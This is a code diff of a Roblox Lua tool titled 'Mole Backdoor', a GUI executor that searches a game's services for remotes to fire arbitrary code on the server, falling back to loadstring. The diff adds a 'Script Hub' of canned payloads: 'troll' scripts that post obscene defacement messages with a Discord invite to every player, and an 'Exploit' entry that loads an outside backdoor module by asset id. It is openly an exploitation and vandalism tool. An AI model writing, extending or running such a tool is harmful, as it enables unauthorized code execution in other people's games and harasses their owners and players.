@@ -1,4 +1,3 @@
--- Services
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
@@ -29,7 +28,7 @@ TopBar.Parent = Main
 Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 12)
 
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, -100, 1, 0)
+Title.Size = UDim2.new(1, -130, 1, 0)
 Title.Position = UDim2.new(0, 10, 0, 0)
 Title.BackgroundTransparency = 1
 Title.Text = "Mole Backdoor"
@@ -87,7 +86,7 @@ ButtonHolder.Position = UDim2.new(1, -100, 0, 50)
 ButtonHolder.BackgroundTransparency = 1
 ButtonHolder.Parent = Main
 
--- Create Buttons
+-- Buttons: Execute, Clear, Script Hub
 local function createButton(text, yOffset)
 	local Btn = Instance.new("TextButton")
 	Btn.Size = UDim2.new(1, 0, 0, 44)
@@ -114,8 +113,142 @@ end
 
 local ExecuteBtn = createButton("EXECUTE", 0)
 local ClearBtn = createButton("CLEAR", 52)
+local ScriptHubBtn = createButton("SCRIPT HUB", 104)
 
--- Remote search and executor
+-- === Script Hub UI ===
+local HubFrame = Instance.new("Frame")
+HubFrame.Size = UDim2.new(0, 320, 0, 300)
+HubFrame.Position = UDim2.new(0.5, 250, 0.5, -150)
+HubFrame.AnchorPoint = Vector2.new(0, 0.5)
+HubFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
+HubFrame.BorderSizePixel = 0
+HubFrame.Visible = false
+HubFrame.Parent = UI
+Instance.new("UICorner", HubFrame).CornerRadius = UDim.new(0, 10)
+
+local HubTopBar = Instance.new("Frame")
+HubTopBar.Size = UDim2.new(1, 0, 0, 30)
+HubTopBar.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
+HubTopBar.BorderSizePixel = 0
+HubTopBar.Parent = HubFrame
+Instance.new("UICorner", HubTopBar).CornerRadius = UDim.new(0, 10)
+
+local HubTitle = Instance.new("TextLabel")
+HubTitle.Size = UDim2.new(1, 0, 1, 0)
+HubTitle.BackgroundTransparency = 1
+HubTitle.Text = "Script Hub"
+HubTitle.Font = Enum.Font.GothamBold
+HubTitle.TextColor3 = Color3.fromRGB(230, 230, 230)
+HubTitle.TextSize = 18
+HubTitle.Parent = HubTopBar
+
+local ScriptList = Instance.new("ScrollingFrame")
+ScriptList.Size = UDim2.new(1, -20, 1, -40)
+ScriptList.Position = UDim2.new(0, 10, 0, 35)
+ScriptList.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
+ScriptList.BorderSizePixel = 0
+ScriptList.CanvasSize = UDim2.new(0, 0, 5, 0)
+ScriptList.ScrollBarThickness = 8
+ScriptList.Parent = HubFrame
+Instance.new("UICorner", ScriptList).CornerRadius = UDim.new(0, 8)
+
+local UIListLayout = Instance.new("UIListLayout")
+UIListLayout.Padding = UDim.new(0, 6)
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout.Parent = ScriptList
+
+-- Scripts Table
+local scripts = {
+	["Troll"] = {
+		["Hint Message"] = [[
+local hint = Instance.new("Hint", workspace)
+hint.Text = "THIS GAME JUST GOT FUCKED BY PEPSI (DISCORD: https://discord.gg/jzYpRg3vqX)"
+]],
+		["Message Popup"] = [[
+local message = Instance.new("Message", workspace)
+message.Text = "THIS GAME JUST GOT FUCKED BY PEPSI (DISCORD: https://discord.gg/jzYpRg3vqX)"
+wait(1)
+message:Destroy()
+]]
+	},
+
+	["Utility"] = {
+		["Print Hello"] = [[print("Hello from Script Hub!")]]
+	},
+
+	["Exploit"] = {
+		["Polaria Loader"] = {
+			code = [[
+require(123255432303221):Pload(game.Players.LocalPlayer)
+]],
+			dangerous = true
+		}
+	},
+
+	["⚙ Settings"] = {
+		["Toggle Dark Theme"] = {
+			action = function()
+				local isDark = Main.BackgroundColor3 == Color3.fromRGB(22, 22, 28)
+				if isDark then
+					Main.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
+					TopBar.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+					Editor.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
+					Editor.TextColor3 = Color3.fromRGB(10, 10, 10)
+					ButtonHolder.BackgroundTransparency = 1
+				else
+					Main.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
+					TopBar.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
+					Editor.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
+					Editor.TextColor3 = Color3.fromRGB(235, 235, 235)
+				end
+			end
+		},
+		["Made by Wanna Die ❤️"] = [[-- Respect the creator]]
+	}
+}
+
+-- Populate ScriptList
+for categoryName, categoryScripts in pairs(scripts) do
+	local categoryLabel = Instance.new("TextLabel")
+	categoryLabel.Size = UDim2.new(1, 0, 0, 25)
+	categoryLabel.BackgroundTransparency = 1
+	categoryLabel.Text = categoryName
+	categoryLabel.Font = Enum.Font.GothamBold
+	categoryLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+	categoryLabel.TextSize = 16
+	categoryLabel.TextXAlignment = Enum.TextXAlignment.Left
+	categoryLabel.Parent = ScriptList
+
+	for name, data in pairs(categoryScripts) do
+		local code = (typeof(data) == "table" and data.code) or (typeof(data) == "string" and data) or ""
+		local isDangerous = (typeof(data) == "table" and data.dangerous) or false
+
+		local Btn = Instance.new("TextButton")
+		Btn.Size = UDim2.new(1, 0, 0, 40)
+		Btn.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
+		Btn.TextColor3 = isDangerous and Color3.fromRGB(255, 120, 120) or Color3.fromRGB(255, 255, 255)
+		Btn.Font = Enum.Font.Gotham
+		Btn.TextSize = 14
+		Btn.Text = name
+		Btn.BorderSizePixel = 0
+		Btn.Parent = ScriptList
+		Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 6)
+
+		Btn.MouseButton1Click:Connect(function()
+			if typeof(data) == "table" and data.action then
+				data.action()
+			else
+				if isDangerous then
+					print("⚠️ Polaria script loaded (risky).")
+				end
+				Editor.Text = code
+				HubFrame.Visible = false
+			end
+		end)
+	end
+end
+
+-- === REMOTE EXECUTOR ===
 local servicesToScan = {
 	game:GetService("ReplicatedStorage"),
 	game:GetService("Workspace"),
@@ -142,45 +275,41 @@ local function tryFireRemote(scriptText)
 	return sent
 end
 
--- Fallback local executor
+-- === LOCAL EXECUTOR ===
 local function tryLocalExecute(code)
 	if not loadstring then
-		warn("[Executor] Loadstring not supported in this environment.")
+		warn("[Executor] Loadstring not supported.")
 		return
 	end
-
 	local f, err = loadstring(code)
 	if f then
 		local ok, execErr = pcall(f)
-		if not ok then
-			warn("[Executor] Runtime error:", execErr)
-		else
-			print("[Executor] Code executed locally.")
-		end
+		if not ok then warn("[Executor] Runtime error:", execErr)
+		else print("[Executor] Code executed locally.") end
 	else
 		warn("[Executor] Loadstring error:", err)
 	end
 end
 
--- Button events
+-- === BUTTON EVENTS ===
 ExecuteBtn.MouseButton1Click:Connect(function()
 	local code = Editor.Text
 	if code == "" then return end
-
 	local sent = tryFireRemote(code)
-	if not sent then
-		tryLocalExecute(code)
-	end
+	if not sent then tryLocalExecute(code) end
 end)
 
 ClearBtn.MouseButton1Click:Connect(function()
 	Editor.Text = ""
 end)
 
--- Dragging
+ScriptHubBtn.MouseButton1Click:Connect(function()
+	HubFrame.Visible = not HubFrame.Visible
+end)
+
+-- === DRAGGING ===
 local dragging = false
 local dragStart, startPos
-
 TopBar.InputBegan:Connect(function(input)
 	if input.UserInputType == Enum.UserInputType.MouseButton1 then
 		dragging = true
@@ -188,33 +317,48 @@ TopBar.InputBegan:Connect(function(input)
 		startPos = Main.Position
 	end
 end)
-
 UserInputService.InputChanged:Connect(function(input)
 	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
 		local delta = input.Position - dragStart
-		Main.Position = UDim2.new(
-			startPos.X.Scale, startPos.X.Offset + delta.X,
-			startPos.Y.Scale, startPos.Y.Offset + delta.Y
-		)
+		Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
 	end
 end)
-
 UserInputService.InputEnded:Connect(function(input)
 	if input.UserInputType == Enum.UserInputType.MouseButton1 then
 		dragging = false
 	end
 end)
 
--- Minimize & Close
+-- === HUB FRAME DRAG ===
+local draggingHub = false
+local dragStartHub, startPosHub
+HubFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		draggingHub = true
+		dragStartHub = input.Position
+		startPosHub = HubFrame.Position
+	end
+end)
+UserInputService.InputChanged:Connect(function(input)
+	if draggingHub and input.UserInputType == Enum.UserInputType.MouseMovement then
+		local delta = input.Position - dragStartHub
+		HubFrame.Position = UDim2.new(startPosHub.X.Scale, startPosHub.X.Offset + delta.X, startPosHub.Y.Scale, startPosHub.Y.Offset + delta.Y)
+	end
+end)
+UserInputService.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		draggingHub = false
+	end
+end)
+
+-- === MINIMIZE & CLOSE ===
 local minimized = false
-local function toggleMinimize()
+MinBtn.MouseButton1Click:Connect(function()
 	minimized = not minimized
 	Editor.Visible = not minimized
 	ButtonHolder.Visible = not minimized
-	Main.Size = minimized and UDim2.new(0, 480, 0, 60) or UDim2.new(0, 480, 0, 340)
-end
-
-MinBtn.MouseButton1Click:Connect(toggleMinimize)
+	Main.Size = minimized and UDim2.new(0, 480, 0, 40) or UDim2.new(0, 480, 0, 340)
+end)
 CloseBtn.MouseButton1Click:Connect(function()
 	UI:Destroy()
 end)
